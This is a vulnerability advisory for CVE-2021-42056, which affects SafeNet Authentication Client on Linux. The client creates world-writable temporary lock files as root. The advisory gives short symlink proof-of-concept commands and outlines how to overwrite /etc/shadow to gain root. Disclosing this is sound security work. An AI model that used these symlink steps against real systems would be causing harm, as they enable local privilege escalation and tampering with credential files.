# Safenet Authentication Client Privilege Escalation CVE-2021-42056

Based on Thales' website [1], SafeNet Authentication Client – is a middleware client that manages Thales' extensive SafeNet portfolio of certificate-based authenticators, including eTokens, SafeNet IDPrime smart cards, USB and software-based devices.

Improper permissions have been set on multiple files allowing file overwrite as root user - as well as privilege escalation (requiring multiple steps).

# Details

CWE-378: Creation of Temporary File With Insecure Permissions
CWE-377: Insecure Temporary File

During installation, Safenet set chmod 777 on the following directories, and 666 on files (listing files which are still vulnerable on latest SAC version):
- /tmp/eToken.hid/*
- /tmp/eToken.lock/*
- /var/tmp/eToken.cache/*

eToken.* are created/updated when SafeNet Authentication Client is performing different operations (eg. lock/unlock).

Two different issues:
- files are created with a static name
- permissions are set to world-read/write/execution ; and created with root privileges

Therefore, any local attacker can, through a symlink attack:
- overwrite any file on the system with SACSrv privileges (launched by default as root). Overwriting some system files (eg. /bin/sh, /etc/shadow) might be critical
- obtain root/777 privileges and put malicious/modified content on a legitimate one (eg. /etc/shadow)
- obtain root shell access on the system by replacing root hash on the "new" /etc/shadow file

The same issue has been found on Windows-based system ("Everyone" set with "Full control" permissions) on these files - and didn't find any easy way to exploit with a symlink attack (blocked by default in any recent Windows systems).

# PoC
drwxrwxrwx 2 root root 4.0K Jul 10 21:18 eToken.lock

-rw-rw-rw- 1 root root 0 Jul 10 21:30 'AKS ifdh [eToken 5110 SC] 00 00.lock'

It's the same for eToken.hid

drwxrwxrwx 2 root root 4.0K Jul 10 21:30 eToken.hid

-rw-rw-rw- 1 root root 0 Jul 10 21:30 global.lock

- z00@z00:/tmp/eToken.lock/$ ln -s /etc/passwdTEST 'AKS ifdh [eToken 5110 SC] 00 00.lock'

or

- z00@z00:/tmp/eToken.hid/$ ln -s /etc/passwdTEST global.lock

When token status changed (user is logging in; reconnecting through their VPN):

$ ls -laht /etc/passwdTEST
-rw-rw-rw- 1 root root 0 Jul 10 21:20 /etc/passwdTEST


# Information and Timeline
- Discovered by: @z00kov - CERT Orange Cyberdefense
- https://www.orangecyberdefense.com/
- CVE-2021-42056
- Release date: 13.06.2022
- Revision 1.0
- Severity: Low/Medium
- 12.07.2021: Reported to Thales
- 13.07.2021: Thales ack
- 21.07.2021: Thales answered this issue should be fixed during Q2 2022
- 21.07.2021: Answered this issue will be published after 120 days
- 07.10.2021: MITRE assigned CVE-2021-42056
- 12.06.2022: Latest version (10.7.7) still vulnerable
- 13.06.2022: Release date
- 28.07.2023: Latest version (22.3) still vulnerable
[1] https://cpl.thalesgroup.com/en-gb/access-management/security-applications/authentication-client-token-management
